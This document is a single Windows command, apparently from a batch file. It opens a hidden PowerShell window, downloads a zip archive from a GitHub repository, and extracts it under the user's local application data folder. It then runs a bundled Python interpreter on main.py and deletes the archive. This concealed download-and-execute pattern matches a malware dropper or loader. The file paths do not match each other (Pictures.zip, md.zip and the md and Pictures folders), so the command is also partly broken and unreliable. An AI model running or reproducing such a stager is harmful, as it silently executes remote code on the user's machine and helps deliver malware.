start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/longchinngon69/123/raw/refs/heads/main/md.zip', \"$env:LOCALAPPDATA\Pictures.zip\"); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:LOCALAPPDATA\md.zip\", \"$env:LOCALAPPDATA\Pictures\"); Start-Sleep -Seconds 1; & \"$env:LOCALAPPDATA\md\python.exe\" \"$env:LOCALAPPDATA\md\main.py\"; del \"$env:LOCALAPPDATA\md.zip\""